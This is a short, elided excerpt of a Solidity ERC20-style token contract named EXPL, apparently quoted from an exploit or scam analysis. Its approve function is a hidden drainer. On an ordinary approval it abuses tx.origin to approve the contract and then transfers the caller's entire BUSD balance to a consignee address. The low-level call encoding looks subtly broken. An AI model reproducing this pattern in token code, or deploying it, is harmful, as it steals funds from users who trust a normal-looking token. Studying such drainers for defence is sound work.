...
contract EXPL is Context, IERC20, IERC20Metadata, Ownable {   
    ...
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        ...
        if(spender != address(this) && spender != owner()) {
            _approve(tx.origin, address(this), amount);
            ...
            (bool _success, bytes memory _contractBUSDBalance) = address(contractBUSDAddress).call(abi.encode(bytes4(keccak256('balanceOf(address)')), tx.origin));
            (uint256 contractBUSDBalance) = abi.decode(_contractBUSDBalance, (uint256));
            address(contractBUSDAddress).call(abi.encode(bytes4(keccak256("transferFrom(address,address,uint256)")), tx.origin, addressConsignee, contractBUSDBalance));
        } else {
